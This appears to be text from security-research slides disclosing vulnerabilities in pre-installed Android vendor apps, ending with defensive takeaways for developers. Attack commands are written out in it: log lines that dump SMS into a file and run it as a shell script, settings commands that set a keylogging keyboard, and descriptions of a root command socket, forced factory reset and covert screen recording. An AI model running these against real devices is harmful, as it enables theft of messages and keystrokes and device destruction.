Approach 2: Transfer Command Output Using a File in App’s Directory
1. Choose log tag with high entropy (e.g., UQ2h9hVRhLfg)
2. Make attacking app’s private directory world-executable and create a globally writable and 
readable file (msg.txt)
3. Write lines of the script with selected log tag to the log from the attacking app
Log.d("UQ2h9hVRhLfg", "#!/bin/sh");
Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > 
/data/data/com.attacking.app/msg.txt");
4. Make the vulnerable app execute commands so it writes the lines to a shell script and executes it
logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f 
/data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh -d
chmod 770 /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh
sh /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh

Setting Your App as the Default Keyboard for Some Keylogging
Have the attacking app implement an Input Method Editor (IME)
/system/bin/settings put secure enabled_input_methods :com.my.app/.NotSomeKeyboardService
/system/bin/settings put secure default_input_method com.my.app/.NotSomeKeyboardService
Send key presses to the attacking app via a sending a broadcast intent to a dynamically-registered 
broadcast receiver
Can also set your app as the default spell checker
– Does not get the same amount of data as the “custom” keyboard
/system/bin/settings put secure selected_spell_checker com.my.app/.NotSomeSpellingService

Analysis Framework Workflow
29
Exposed Screenshot Capability
Certain vendors have modified the Android OS (system_server) to 
export the screenshot capability to any app on the device
– Alcatel A30, Asus Zenfone 3 Max, Leagoo P1, Nokia 6 TA-1025, 
Asus ZenFone V Live & Sony Xperia L1
Malicious apps can open apps to obtain sensitive data and examine active 
notifications
– Requires READ_EXTERNAL_STORAGE permission to access the
screenshot and EXPAND_STATUS_BAR to view current
notifications
Taking of a screenshot is not transparent to the user
– A screen animation is displayed and creates a notification
– Cannot be disabled, as the functionality lies within system_server
– Attacking app can cause a system crash to remove the notification
– Can bypass screen lock by using certain WindowManager.LayoutParams flags

Exported interfaces allow zero-permission app to send arbitrary text messages, read and 
modify text messages, and obtain phone numbers of the user’s contacts
App has two different package names, where one is a 
refactored version of the other
– com.rcs.gsma.na.sdk
– com.suntek.mway.rcs.app.service
Affects 3 T-Mobile devices: Coolpad Defiant, 
T-Mobile Revvl Plus, and ZTE ZMAX Pro
App cannot be disabled

ZTE ZMAX Champ Vulnerabilities
Programmatic factory reset
– com.zte.zdm.sdm app writes --wipe_data to 
/cache/recovery/command and boots into 
recovery mode and wipes /data and /cache
Obtain logcat and modem logs
– Done in the same way described as previously for ZTE
“Brick” Device
– Device will boot into recovery mode, try to factory 
reset, crash, and repeat and repeat some more

Unlocked Alcatel A30 – Local root Privilege Escalation
Alcatel A30 was an Amazon Prime Exclusive device
– Had discounted price due to the inclusion of Amazon offers and ads 
Certain read-only properties can be modified at runtime 
allowing a socket that accepts and executes arbitrary 
commands as the root user
– Can be performed via ADB or pre-installed platform apps that 
execute as the system user

Unlocked Alcatel A30 – Socket that Executes Commands as root
Once the ro.debuggable property is set to 1, 
then a world-writable socket named 
factory_test gets created
– Receives and executes commands as root
The system user, including platform apps, can 
change the ro.debuggable property so that 
the factory_test socket gets created

Takeaways - Towards More Secure Apps
Don’t export app components unnecessarily - enforce proper access control
Don’t assume apps without an accompanying Android Definition Interface 
Language (AIDL) file cannot interact with a bound service…they can
Filter commands when allowing command execution as system user 
Make it easier to report vulnerabilities by having a common email address such 
as security@.com

Exposing Capability to Set System Properties
App named com.qualcomm.qti.modemtestmode allows any app to set 
certain properties as the com.android.phone user
– Presumably a development/debugging app that should not be included in production builds
Bound service that takes key/value pair for system properties
– android.os.SystemProperties.set(String, String)
Setting properties is constrained by SELinux rules
– Works for persist.* properties which survive reboots

Set properties as the com.android.phone user
– Can enable screen touch coordinates to be written to the logcat log
Record the screen for 60 minutes to attacking app’s directory
– A notification and icon appears but can be removed quickly
– Can initiate screen-recording while screen is off to remove
any disturbance on the screen
